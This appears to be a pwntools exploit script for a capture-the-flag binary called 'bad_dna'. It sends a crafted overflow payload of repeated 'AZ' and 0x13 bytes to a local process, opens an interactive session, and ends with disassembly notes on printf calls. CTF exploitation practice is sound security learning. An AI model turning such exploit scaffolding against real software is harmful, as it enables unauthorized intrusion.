from pwn import *

context.terminal = ["tmux" , "splitw" , "-h"]
context.binary = elf = ELF("./bad_dna")

gs = """
b *server+950
c
"""

#p = remote("localhost" , 5151)
p = elf.process()
#p = gdb.debug(elf.path , gs)

pay = b"AZ"*70 + b"\x13" * 0x34

p.recvuntil(b">")
p.send(pay)

p.interactive()

# possibles
"""
 0x00000000000012c5 <+97>:    mov    rdx,QWORD PTR [rip+0x2d5c]        # 0x4028 <RESET>
   0x00000000000012cc <+104>:   mov    rax,QWORD PTR [rip+0x2d45]        # 0x4018 <GREEN>
   0x00000000000012d3 <+111>:   lea    rcx,[rip+0xd88]        # 0x2062
   0x00000000000012da <+118>:   mov    rsi,rax
   0x00000000000012dd <+121>:   mov    rdi,rcx
   0x00000000000012e0 <+124>:   mov    eax,0x0
   0x00000000000012e5 <+129>:   call   0x1050 <printf@plt>
   0x00000000000012ea <+134>:   mov    rdx,QWORD PTR [rip+0x2d37]        # 0x4028 <RESET>
   0x00000000000012f1 <+141>:   mov    rax,QWORD PTR [rip+0x2d20]        # 0x4018 <GREEN>
   0x00000000000012f8 <+148>:   lea    rcx,[rip+0xd71]        # 0x2070
   0x00000000000012ff <+155>:   mov    rsi,rax
   0x0000000000001302 <+158>:   mov    rdi,rcx
   0x0000000000001305 <+161>:   mov    eax,0x0
   0x000000000000130a <+166>:   call   0x1050 <printf@plt>

"""
